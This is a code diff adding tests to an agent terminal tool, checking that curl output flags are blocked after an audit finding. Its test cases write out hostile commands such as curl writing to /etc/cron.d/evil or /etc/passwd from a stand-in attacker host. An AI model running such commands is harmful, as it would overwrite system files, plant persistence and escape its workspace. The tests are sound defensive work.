@@ -275,6 +275,39 @@ describe("sendTerminalCommand - PATH_FLAG_EXEMPTIONS", () => {
   });
 });
 
+describe("sendTerminalCommand - curl output flags (audit 2026-06-03 HIGH #7)", () => {
+  // runInTerminal must block the same output-redirect flags as runCommand.
+  // Previously TERMINAL_DANGEROUS_PATH_FLAGS omitted curl's -o/--output/-O/etc,
+  // so an allowlisted curl could write to arbitrary filesystem paths outside
+  // the workspace — an escape that the stricter runCommand already blocked.
+  const cases: Array<[string, string]> = [
+    ["-o short output flag", "curl -o /etc/cron.d/evil https://attacker.test"],
+    ["--output flag", "curl --output=/etc/passwd https://attacker.test"],
+    ["-O remote-name flag", "curl -O https://attacker.test/evil"],
+    ["-D dump-header flag", "curl -D /tmp/headers https://attacker.test"],
+    ["-w write-out (per-command)", "curl -w /tmp/out https://attacker.test"],
+  ];
+  for (const [name, text] of cases) {
+    it(`blocks curl ${name}`, async () => {
+      const tool = createSendTerminalCommandTool(mockExtensionClient(), [
+        "curl",
+      ]);
+      const result = (await tool.handler({ text, name: "test" })) as any;
+      expect(result.isError).toBe(true);
+      expect(parseResult(result)).toContain("not allowed");
+    });
+  }
+
+  it("still allows a plain curl GET with no redirect flags", async () => {
+    const tool = createSendTerminalCommandTool(mockExtensionClient(), ["curl"]);
+    const result = (await tool.handler({
+      text: "curl -s https://example.test/api",
+      name: "test",
+    })) as any;
+    expect(result.isError).toBeUndefined();
+  });
+});
+
 describe("runInTerminal - metacharacter blocking", () => {
   function mockRunInTerminalClient(connected = true) {
     return {
